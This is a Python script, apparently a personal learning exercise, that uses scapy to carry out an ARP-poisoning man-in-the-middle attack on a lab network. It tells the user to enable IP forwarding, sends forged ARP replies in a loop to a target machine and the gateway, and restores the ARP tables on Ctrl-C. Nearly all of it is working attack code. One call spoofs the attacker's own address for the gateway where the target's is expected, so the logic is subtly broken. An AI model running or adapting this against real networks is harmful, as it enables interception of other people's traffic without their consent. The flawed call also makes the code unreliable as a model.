import scapy.all as scapy
import time

# python3 My_Mitm.py

# -------------------------------------------------------
# first you need to write 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# then you can use this app on kali linux
# my arp posion
# op = 1 request   ||   op = 2 response
# -------------------------------------------------------


def get_mac_adress(ip):
    arp_request = scapy.ARP(pdst = ip)
    #scapy.ls(scapy.ARP())       # get info
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())     # get info

    combined_packet = broadcast/arp_request
    answered_list= scapy.srp(combined_packet,verbose=False ,timeout = 1)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_adress(target_ip)
    # print("target_ip : ",target_ip,"  poisoned_ip : ",poisoned_ip,"   mac : ",target_mac)
    # arp_response = scapy.ARP(op = 2,pdst = "10.0.2.15",hwdst = "08:00:27:e6:e5:59", psrc = "10.0.2.1")

    arp_response = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac, psrc = poisoned_ip)
    scapy.send(arp_response, verbose=False)     # sending report is false - 'verbose'

    # arp_response = scapy.ARP()    # get your Operating System details
    # scapy.ls(scapy.ARP())           # get info

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_adress(fooled_ip)
    gateway_mac = get_mac_adress(gateway_ip)
    arp_response = scapy.ARP(op = 2, pdst = fooled_ip,hwdst = fooled_mac, psrc = gateway_ip, hwsrc= gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)     # sending report is false - 'verbose'
                                                         # count=6  send package for 6 times

# -------------------------------------------------------
# target ip : 10.0.2.15   second machine
# my ip : 10.0.2.4        current machine
# modem ip : 10.0.2.1     modem
# -------------------------------------------------------
num = 0;
try :
    while True :
        arp_poisoning("10.0.2.15","10.0.2.1")   # for target
        arp_poisoning("10.0.2.1","10.0.2.4")    # for modem
        num += 2
        print("\rsending packets ",end = " "+str(num))
        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit and Reset")
    reset_operation("10.0.2.15","10.0.2.1")
    reset_operation("10.0.2.1","10.0.2.15")

